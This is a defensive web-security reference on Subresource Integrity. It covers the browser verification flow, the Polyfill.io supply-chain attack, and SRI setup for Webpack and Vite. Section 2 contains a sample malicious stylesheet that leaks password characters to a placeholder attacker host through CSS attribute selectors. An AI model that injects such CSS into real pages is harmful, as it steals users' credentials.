# Subresource Integrity & CDN Asset Security — Technical Reference

## 1. W3C SRI Verification Algorithm

When a user agent encounters a subresource with an `integrity` metadata attribute, it executes
the following verification pipeline:

```
              Browser fetches resource from CDN
                             │
                             ▼
              Does resource have CORS approval?
             (Access-Control-Allow-Origin header)
                   │                    │
                  No                   Yes
                   │                    │
                   ▼                    ▼
          Block execution        Collect raw bytes
          (CORS error)                  │
                                        ▼
                              Parse 'integrity' attribute
                             (Identify strongest algorithm)
                                        │
                                        ▼
                              Compute cryptographic hash
                              over identical raw bytes
                                        │
                                        ▼
                              Does computed hash match
                              any expected digest?
                                   │          │
                                  No         Yes
                                   │          │
                                   ▼          ▼
                             Block execution  Execute script /
                             Dispatch onerror apply CSS
```

### Key Security Nuance: Raw Bytes vs Decoded Text
The hash must be calculated over the exact raw response bytes. Any transparent proxy alteration,
character encoding conversion, or compression difference (gzip vs brotli) will alter the digest
and trigger an integrity block. Always ensure CDN assets have deterministic compression and encoding.

---

## 2. CSS Injection Attacks via Compromised Stylesheets

A common misconception is that external CSS stylesheets (`<link rel="stylesheet">`) are harmless
and do not require SRI. **This is false.**

### Attack Mechanics: CSS Data Exfiltration
If an attacker modifies a stylesheet on an unprotected CDN, they can exfiltrate sensitive form inputs
(passwords, CSRF tokens, credit card numbers) using CSS attribute selectors and background requests:

```css
/* Malicious CSS injected via compromised CDN stylesheet */
input[name="password"][value^="a"] {
  background-image: url("https://attacker.com/log?char=a");
}
input[name="password"][value^="b"] {
  background-image: url("https://attacker.com/log?char=b");
}
/* Reconstructed character by character as user types! */
```

Furthermore, CSS can alter visual UI elements, overlay invisible clickjacking masks over buttons,
or hide critical security warnings. **Always apply SRI to stylesheets as well as scripts.**

---

## 3. Case Study: The Polyfill.io Supply Chain Attack (June 2024)

- **Target:** `cdn.polyfill.io` (used by >100,000 domains including major media, healthcare, and enterprise sites).
- **Attack Vector:** Domain acquisition by a malicious third-party entity.
- **Payload Behavior:** The CDN began inspecting HTTP headers (specifically `User-Agent` and `Referer`). For mobile devices and search engine crawlers, it served malicious redirects and phishing scripts; for security researchers and desktop curl requests, it returned clean code.
- **Why SRI Succeeded:** Sites using hardcoded SRI hashes immediately broke the malicious script load because the modified file's hash differed from the expected hash. Sites without SRI unknowingly executed malicious malware in their visitors' browsers for weeks.

---

## 4. Complete Bundler Configurations

### Webpack 5 Integration
Install plugin:
```bash
npm install --save-dev webpack-subresource-integrity html-webpack-plugin
```

Configuration (`webpack.config.js`):
```javascript
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const { SubresourceIntegrityPlugin } = require('webpack-subresource-integrity');

module.exports = {
  entry: './src/index.js',
  output: {
    filename: '[name].[contenthash].js',
    path: path.resolve(__dirname, 'dist'),
    crossOriginLoading: 'anonymous', // CRITICAL for SRI
    clean: true,
  },
  plugins: [
    new HtmlWebpackPlugin({
      template: './public/index.html',
    }),
    new SubresourceIntegrityPlugin({
      hashFuncNames: ['sha384'],
      enabled: true,
    }),
  ],
};
```

### Vite Integration
Install plugin:
```bash
npm install --save-dev vite-plugin-manifest-sri
```

Configuration (`vite.config.ts`):
```typescript
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import sri from 'vite-plugin-manifest-sri';

export default defineConfig({
  plugins: [
    react(),
    sri({
      algorithms: ['sha384'],
    }),
  ],
  build: {
    rollupOptions: {
      output: {
        entryFileNames: 'assets/[name]-[hash].js',
        chunkFileNames: 'assets/[name]-[hash].js',
        assetFileNames: 'assets/[name]-[hash].[ext]',
      },
    },
  },
});
```

---

## 5. Third-Party Governance Framework

For dynamic scripts where SRI is not feasible (e.g. Google Tag Manager or payment SDKs):

1. **Strict Content Security Policy:**
   ```http
   Content-Security-Policy: script-src 'self' https://js.stripe.com https://www.googletagmanager.com;
   ```
2. **Dedicated Payment Domains:**
   Host checkout flows on isolated domains (e.g. `pay.example.com`) that do not load marketing
   or tracking scripts.
3. **Subresource Monitoring:**
   Use tools like Sentry or automated headless browser jobs to periodically snapshot and alert
   on unannounced third-party script changes.
